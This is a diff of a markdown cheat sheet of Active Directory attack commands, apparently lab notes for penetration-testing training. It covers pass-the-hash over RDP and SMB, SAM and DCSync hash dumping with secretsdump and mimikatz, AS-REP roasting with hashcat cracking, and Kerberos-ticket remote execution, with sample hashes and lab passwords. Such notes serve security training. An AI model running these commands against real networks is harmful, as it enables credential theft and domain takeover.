@@ -315,29 +315,20 @@ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
 /ptt - no output in file, just inject the golden ticket in current session.
-```
-Failed logins result in a [-]
-Successful logins result in a [+] Domain\Username:Password
-Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.
-
-rdp(sometimes authentication not correct):
-(To enable passing the hash in xfreerdp, cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f')
-proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this user is localuser,do not specify domain!!!!!) /p:Mushroom! /v:172.16.218.82:port /cert-ignore
-xfreerdp /v:192.168.153.175 /cert-ignore /u:L.Livingstone /pth:19a3a7550ce8c505c2d46b5e39d6f808
-
-smb(-x requires admin privilege):
-for impacket-psexec.py to have shell by smb, Admin$ or C$ need to be writable
-proxychains4 -f /etc/proxychains4.conf smbclient //172.16.196.13/IPC$(sharename) -U offsec%lab
-
-mssql:
-impacket-mssqlclient relia.com/dnnuser:DotNetNukeDatabasePassword\!@192.168.192.248 -port 49965
-```
 
 ###### Dump the local password hash and domain cached hash
 ```
+Extract hashes from windows.old's sam and system file:
+
 impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
-impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
-impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
+```
+###### Domain Controller Synchronization
+>The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.
+>To perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
+![image](https://github.com/user-attachments/assets/6fc92c9b-f6fc-49cc-a127-e8f41ba74ce2)
+```
+lsadump::dcsync /user:<user>
+kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
 
 ###### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
@@ -350,13 +341,16 @@ klist
 .\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
 ###### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
-Enum users with Do not require Kerberos preauthentication enabled
 ```
+Linux way:
+
+Enum users with Do not require Kerberos preauthentication enabled
 PowerView's Get-DomainUser function with the option -PreauthNotRequired
 kali: impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast domain/username:pass
 ```
-Extract hashes and Crack
 ```
+Windows way:
+
 .\Rubeus.exe asreproast /nowrap
 hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
@@ -525,15 +519,7 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
-#### Domain Controller Synchronization
->If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
 
->to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
-```
-lsadump::dcsync /user:Administrator
-lsadump::dcsync /user:corp\Administrator
-kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
-```
 #### Tips
 >Always remeber to sync the kdc timestamp before conducting any AD actions such as reset password of another user
 ```
